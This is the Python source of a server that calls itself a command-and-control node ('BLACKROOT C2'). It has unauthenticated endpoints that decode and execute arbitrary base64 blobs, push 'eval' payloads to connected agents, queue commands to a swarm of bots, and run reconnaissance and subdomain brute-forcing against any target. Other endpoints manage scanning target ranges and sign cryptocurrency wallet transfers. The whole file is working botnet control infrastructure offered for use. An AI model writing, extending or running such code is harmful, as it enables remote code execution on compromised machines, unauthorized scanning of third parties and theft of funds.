# --- RepairAgent endpoints ---
#!/usr/bin/env python3
"""
BLACKROOT C2 – WRAITHNET node
Unified WebSocket + REST + Redis listener
"""
import asyncio, json, os, sys, base64, threading, uuid, logging
import redis.asyncio as aioredis
import redis
import websockets
from fastapi import FastAPI, Request, HTTPException, Body
from fastapi.middleware.cors import CORSMiddleware
from typing import Dict, Any
from dataclasses import asdict

# --- path hack for assimilate ---
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "assimilate", "src")))

from recon.scanner import ReconModule
from black_vault import BlackVault
from swarm_mesh import SwarmMesh
from assimilate.src.neuro_assimilator import NeuroAssimilatorAgent

logging.basicConfig(level=logging.INFO, format="%(asctime)s [C2] %(message)s")
logger = logging.getLogger("C2")

# ---------- CONFIG ----------
C2_PORT   = int(os.getenv("C2_PORT", 8765))
HTTP_PORT = int(os.getenv("HTTP_PORT", 8000))
REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379")



redis_client = aioredis.from_url(REDIS_URL, decode_responses=True)
sync_redis_client = redis.from_url(REDIS_URL, decode_responses=True)
swarm        = SwarmMesh("controller-node")
swarm.redis  = sync_redis_client  # SwarmMesh expects sync Redis
swarm.channel = "blackroot_swarm"

# Synchronous Redis client for ReconModule
sync_redis_client = redis.from_url(REDIS_URL, decode_responses=True)

# Vault auto-picks writable dir
def _vault_dir():
    import tempfile
    try:
        os.makedirs("/tmp/.blackvault", exist_ok=True)
        return "/tmp/.blackvault"
    except Exception:
        return tempfile.mkdtemp(prefix=".vault_")

vault   = BlackVault(password="default", vault_path=_vault_dir())
agent   = NeuroAssimilatorAgent()
agent.vault = vault
rec_mod = ReconModule(vault, swarm, sync_redis_client)

# ---------- WEBSOCKET C2 ----------
async def ws_handler(websocket):
    logger.info("[📡] Agent connected")
    try:
        async for msg in websocket:
            logger.info("[💬] WS: %s", msg)
            await websocket.send(json.dumps({"eval": "console.log('C2 live')"}))
    except websockets.exceptions.ConnectionClosed:
        logger.info("[📡] Agent disconnected")

async def ws_server():
    logger.info("[📡] WRAITHNET C2 listening on ws://0.0.0.0:%s", C2_PORT)
    async with websockets.serve(ws_handler, "0.0.0.0", C2_PORT):
        await asyncio.Future()  # run forever

# ---------- REST API ----------
app = FastAPI(title="BLACKROOT C2")
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"], allow_methods=["*"], allow_headers=["*"]
)
from economic.wallet import WalletManager, EnhancedEconomicMixin
from economic.bel_layer import EconomicV3Mixin
from kernel.core import BlackrootKernel

# --- Wallet & BEL Integration ---
kernel = BlackrootKernel(config={})
wallet_manager = WalletManager(redis_client)
econ_agent = EnhancedEconomicMixin(kernel)

# --- Wallet Endpoints ---
@app.post("/wallet/create")
async def wallet_create(req: Request):
    body = await req.json()
    agent_id = body["agent_id"]
    networks = body.get("networks", ["ethereum"])
    wallets = await wallet_manager.create_wallet(agent_id, networks)
    return {"wallets": {n: asdict(w) for n, w in wallets.items()}}

@app.get("/wallet/portfolio/{agent_id}")
async def wallet_portfolio(agent_id: str):
    econ_agent.agent_id = agent_id
    portfolio = await econ_agent.get_wallet_portfolio()
    return portfolio

@app.post("/wallet/update_balance")
async def wallet_update_balance(req: Request):
    body = await req.json()
    agent_id = body["agent_id"]
    network = body["network"]
    await wallet_manager.update_balance(agent_id, network)
    return {"status": "updated"}

@app.post("/wallet/send")
async def wallet_send(req: Request):
    body = await req.json()
    tx_hash = await wallet_manager.sign_and_send_transaction(
        body["from_agent"], body["network"], {
            "to": body["to_agent"],
            "amount": body["amount"],
            "token_address": body.get("token_address")
        }
    )
    return {"tx_hash": tx_hash}

@app.post("/wallet/bridge")
async def wallet_bridge(req: Request):
    body = await req.json()
    econ_agent.agent_id = body["agent_id"]
    tx_id = await econ_agent.bridge_assets(
        body["from_network"], body["to_network"], body["amount"], body.get("token_address")
    )
    return {"tx_id": tx_id}

@app.post("/wallet/optimize_liquidity")
async def wallet_optimize_liquidity(req: Request):
    body = await req.json()
    econ_agent.agent_id = body["agent_id"]
    moves = await econ_agent.execute_liquidity_optimization()
    return {"executed_moves": moves}

@app.get("/wallet/opportunities/{agent_id}")
async def wallet_opportunities(agent_id: str):
    econ_agent.agent_id = agent_id
    opps = await econ_agent.get_cross_chain_opportunities()
    return opps

# --- BEL Economic Layer Endpoints ---
@app.get("/bel/status/{agent_id}")
async def bel_status(agent_id: str):
    econ_agent.agent_id = agent_id
    return await econ_agent.my_status()

@app.post("/bel/order")
async def bel_order(req: Request):
    body = await req.json()
    econ_agent.agent_id = body["agent_id"]
    if body["side"] == "buy":
        ok = await econ_agent.place_buy_order(body["amount"], body["price"])
    else:
        ok = await econ_agent.place_sell_order(body["amount"], body["price"])
    return {"status": "placed" if ok else "failed"}

@app.post("/bel/cancel_order")
async def bel_cancel_order(req: Request):
    body = await req.json()
    econ_agent.agent_id = body["agent_id"]
    ok = await econ_agent.cancel_order(body["order_id"])
    return {"status": "cancelled" if ok else "not_found"}

@app.get("/bel/market_price")
async def bel_market_price():
    price = await econ_agent.get_market_price()
    return {"market_price": price}

@app.post("/bel/stake")
async def bel_stake(req: Request):
    body = await req.json()
    econ_agent.agent_id = body["agent_id"]
    ok = await econ_agent.stake(body["amount"])
    return {"status": "staked" if ok else "failed"}

@app.post("/bel/unstake")
async def bel_unstake(req: Request):
    body = await req.json()
    econ_agent.agent_id = body["agent_id"]
    ok = await econ_agent.unstake(body["amount"])
    return {"status": "unstaked" if ok else "failed"}

@app.get("/bel/system_health")
async def bel_system_health():
    return await econ_agent.system_health()


@app.post("/assimilate")
async def assimilate(req: Request):
    body = await req.json()
    name, typ, blob_b64 = body["name"], body["type"], body["blob"]
    blob = base64.b64decode(blob_b64)
    vault.store(name, blob)
    ok   = agent.discover_and_assimilate({"name": name, "type": typ, "source": blob})
    return {"status": "assimilated" if ok else "rejected"}

@app.post("/execute")
async def execute():
    results = agent.act("execute_code")
    return {"executed": results}

@app.get("/codex")
def codex_status():
    return {h: {"name": m["name"], "type": m["type"]} for h, m in agent.codex.items()}

@app.post("/dispatch")
async def dispatch(req: Request):
    cmd = await req.json()
    swarm.inject_command(cmd, cmd.get("action", "default"))
    return {"status": "queued", "command": cmd}

@app.post("/recon")
async def recon(req: Request):
    body = await req.json()
    target = body["target"]
    max_depth = body.get("max_depth", 3)
    brute_subdomains = body.get("brute_subdomains", True)
    cid = body.get("command_id", uuid.uuid4().hex)
    res = rec_mod.advanced_recon(target, max_depth, None, brute_subdomains, cid)
    return {"status": "completed", "command_id": cid, "result": res}

@app.get("/status")
def status():
    return {"peers": list(getattr(swarm, 'peers', {}).keys()),
            "pending": getattr(swarm, 'pending_commands', [])}

@app.get("/ping")
def ping():
    return {"pong": True}

@app.post("/run")
async def run_now(req: Request):
    body = await req.json()
    name = body.get("name")
    blob_b64 = body.get("blob")
    if not blob_b64:
        return {"executed": False, "error": "Missing 'blob' in request body"}
    try:
        blob = base64.b64decode(blob_b64)
    except Exception as e:
        return {"executed": False, "error": f"Blob decode failed: {e}"}
    if name:
        vault.store(name, blob)
    result = agent.execute_blob(blob)
    return {"executed": True, "output": result}

# --- ScoutAgent API Endpoints ---
from kernel.core import module_registry
from fastapi import Request

@app.get("/scout/status")
def scout_status():
    scout = module_registry["scout_agent"]()
    return {
        "agent_id": str(scout.agent_id),
        "operational_status": str(scout.operational_status),
        "last_report_time": getattr(scout, "last_report_time", None),
        "current_tactical_mode": getattr(scout, "current_tactical_mode_config", {}).get("description", "unknown"),
        "target_range": getattr(scout, "initial_target_range", []),
    }

@app.get("/scout/nodes")
def scout_nodes():
    scout = module_registry["scout_agent"]()
    return {
        "count": len(scout.known_nodes),
        "nodes": [n.to_dict() for n in scout.known_nodes.values()]
    }

@app.post("/scout/start")
async def scout_start():
    scout = module_registry["scout_agent"]()
    import asyncio
    asyncio.create_task(scout.start())
    return {"status": "started"}

@app.post("/scout/stop")
async def scout_stop():
    scout = module_registry["scout_agent"]()
    import asyncio
    asyncio.create_task(scout.stop())
    return {"status": "stopping"}

@app.post("/scout/add_targets")
async def scout_add_targets(request: Request):
    body = await request.json()
    targets = body.get("targets", [])
    scout = module_registry["scout_agent"]()
    scout.initial_target_range.extend(targets)
    return {"status": "targets_added", "targets": targets}

@app.post("/scout/set_mode")
async def scout_set_mode(request: Request):
    body = await request.json()
    mode = body.get("mode")
    params = body.get("custom_parameters", {})
    scout = module_registry["scout_agent"]()
    if mode:
        from agents.scout import TacticalModes
        scout.current_tactical_mode_config = TacticalModes.configure_mode(mode, params)
        return {"status": "mode_set", "mode": mode, "params": params}
    return {"status": "no_mode_specified"}

@app.post("/scout/force_report")
async def scout_force_report():
    scout = module_registry["scout_agent"]()
    await scout._compile_and_send_report()
    return {"status": "report_sent"}

# --- End ScoutAgent API Endpoints ---

# --- RepairAgent API Endpoints ---
from kernel.core import module_registry

@app.get("/repair/status")
def repair_status():
    repair_agent = module_registry["repair_agent"]()
    return repair_agent.get_metrics()

@app.post("/repair/ticket")
def submit_repair_ticket(ticket: dict = Body(...)):
    repair_agent = module_registry["repair_agent"]()
    from agents.repair import RepairTicket, RepairType, RepairPriority
    t = RepairTicket(
        node_id=ticket["node_id"],
        repair_type=RepairType[ticket.get("repair_type", "PATCH")],
        priority=RepairPriority[ticket.get("priority", "MEDIUM")],
        description=ticket.get("description", "")
    )
    import asyncio
    asyncio.create_task(repair_agent.submit_repair_ticket(t))
    return {"status": "submitted", "ticket_id": t.id}

# ---------- REDIS LISTENER ----------
def redis_listener():
    def _loop():
        import redis
        r = redis.from_url(REDIS_URL, decode_responses=True)
        pubsub = r.pubsub()
        pubsub.subscribe(swarm.channel)
        logger.info("[C2] Redis listener on %s", swarm.channel)
        for msg in pubsub.listen():
            if msg["type"] == "message":
                try:
                    cmd = json.loads(msg["data"])
                    swarm.inject_command(cmd, cmd.get("action", "default"))
                except Exception as e:
                    logger.error("[C2][Redis] %s", e)
    threading.Thread(target=_loop, daemon=True).start()

# ---------- MAIN ----------
async def main():
    redis_listener()
    # run WebSocket + HTTP concurrently
    await asyncio.gather(
        ws_server(),
        asyncio.create_task(asyncio.to_thread(lambda: __import__("uvicorn").run(
            app, host="0.0.0.0", port=HTTP_PORT, log_level="info"
        )))
    )

if __name__ == "__main__":
    asyncio.run(main())